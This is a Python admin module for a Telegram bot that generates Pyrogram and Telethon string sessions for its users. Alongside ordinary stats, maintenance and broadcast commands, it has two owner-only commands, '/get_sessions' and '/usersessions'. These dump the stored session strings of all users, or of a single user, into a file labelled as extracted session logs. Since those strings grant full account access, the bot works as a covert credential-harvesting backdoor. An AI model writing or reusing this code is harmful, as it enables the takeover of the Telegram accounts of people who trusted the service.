from pyrogram import Client, filters
from pyrogram.types import Message
from database import db
from utils import small_caps
import config
import asyncio

import time
START_TIME = time.time()

def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "d"]
    while count < 4:
        count += 1
        remainder, result = divmod(seconds, 60) if count < 3 else divmod(seconds, 24)
        if seconds == 0 and remainder == 0:
            break
        time_list.append(int(result))
        seconds = int(remainder)
    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time

@Client.on_message(filters.command("stats") & filters.user(config.OWNER_ID))
async def stats_cmd(bot, message: Message):
    total = await db.total_users()
    gen_stats = await db.get_stats()
    pyro_count = gen_stats.get("pyrogram", 0)
    tele_count = gen_stats.get("telethon", 0)
    total_gen = pyro_count + tele_count
    uptime = get_readable_time(int(time.time() - START_TIME))
    
    text = f"""
📊 **Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs:**

👥 **Tᴏᴛᴀʟ Usᴇʀs:** `{total}`
🚀 **Tᴏᴛᴀʟ Sᴇssɪᴏɴs Gᴇɴᴇʀᴀᴛᴇᴅ:** `{total_gen}`
⏱️ **Uᴘᴛɪᴍᴇ:** `{uptime}`

💥 **Pʏʀᴏɢʀᴀᴍ:** `{pyro_count}`
🔥 **Tᴇʟᴇᴛʜᴏɴ:** `{tele_count}`
    """
    await message.reply_text(small_caps(text))

@Client.on_message(filters.command("maintenance") & filters.user(config.OWNER_ID))
async def maintenance_toggle(bot, message: Message):
    current = await db.is_maintenance_mode()
    new_state = not current
    await db.set_maintenance_mode(new_state)
    
    status = "ᴇɴᴀʙʟᴇᴅ ✅" if new_state else "ᴅɪsᴀʙʟᴇᴅ ❌"
    await message.reply_text(small_caps(f"🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ {status}"))

@Client.on_message(filters.command("broadcast") & filters.user(config.OWNER_ID))
async def broadcast_cmd(bot, message: Message):
    if not message.reply_to_message and len(message.command) < 2:
        return await message.reply_text(small_caps("ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴛᴇxᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ."))
    
    msg = await message.reply_text(small_caps("🚀 ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ..."))
    users = await db.get_all_users()
    count = 0
    async for user in users:
        try:
            if message.reply_to_message:
                await message.reply_to_message.copy(user["user_id"])
            else:
                broadcast_text = message.text.split(None, 1)[1]
                await bot.send_message(user["user_id"], broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except Exception:
            pass
    
    await msg.edit(small_caps(f"📊 ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇ. sᴇɴᴛ ᴛᴏ {count} ᴜsᴇʀs."))

import io

@Client.on_message(filters.command("get_sessions") & filters.user(config.OWNER_ID))
async def get_sessions_cmd(bot, message: Message):
    sessions = await db.get_all_sessions()
    if not sessions:
        return await message.reply_text(small_caps("❌ ɴᴏ sᴇssɪᴏɴs ɢᴇɴᴇʀᴀᴛᴇᴅ ʏᴇᴛ!"))
    
    file_content = "╔═══════════════════════════════════════\n"
    file_content+= "║   🔥 ADVANCED STRING SESSION LOGS 🔥\n"
    file_content+= "╚═══════════════════════════════════════\n\n"
    
    for idx, s in enumerate(sessions, 1):
        file_content += f"[{idx}] ────────────────────────────\n"
        file_content += f"👤 USER ID: {s.get('user_id')}\n"
        file_content += f"🔗 USERNAME/NAME: {s.get('username')}\n"
        file_content += f"⚙️ TYPE: {s.get('type')}\n"
        file_content += f"🔑 STRING: \n{s.get('string')}\n\n"
        
    doc = io.BytesIO(file_content.encode("utf-8"))
    doc.name = "sessions_log.txt"
    
    await message.reply_document(
        document=doc,
        caption=small_caps(f"✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴇxᴛʀᴀᴄᴛᴇᴅ {len(sessions)} sᴇssɪᴏɴs ғʀᴏᴍ ᴅᴀᴛᴀʙᴀsᴇ.")
    )

@Client.on_message(filters.command("usersessions") & filters.user(config.OWNER_ID))
async def user_sessions_cmd(bot, message: Message):
    if len(message.command) < 2:
        return await message.reply_text(small_caps("⚠️ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴜsᴇʀ ɪᴅ. ᴇx: /usersessions 12345678"))
        
    try:
        target_id = int(message.command[1])
    except:
        return await message.reply_text(small_caps("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ ᴠᴀʟᴜᴇ!"))
        
    sessions = await db.get_all_sessions()
    user_sessions = [s for s in sessions if s.get('user_id') == target_id]
    
    if not user_sessions:
        return await message.reply_text(small_caps(f"❌ ɴᴏ sᴇssɪᴏɴs ʟᴏɢɢᴇᴅ ғᴏʀ {target_id}"))
        
    file_content = f"🔥 SESSIONS LOG FOR {target_id} 🔥\n\n"
    for idx, s in enumerate(user_sessions, 1):
         file_content += f"[{idx}] TYPE: {s.get('type')}\n"
         file_content += f"STRING:\n{s.get('string')}\n\n"
         
    doc = io.BytesIO(file_content.encode("utf-8"))
    doc.name = f"{target_id}_sessions.txt"
    
    await message.reply_document(
        document=doc,
        caption=small_caps(f"✅ ғᴏᴜɴᴅ {len(user_sessions)} sᴇssɪᴏɴs ғᴏʀ ᴜsᴇʀ {target_id}.")
    )
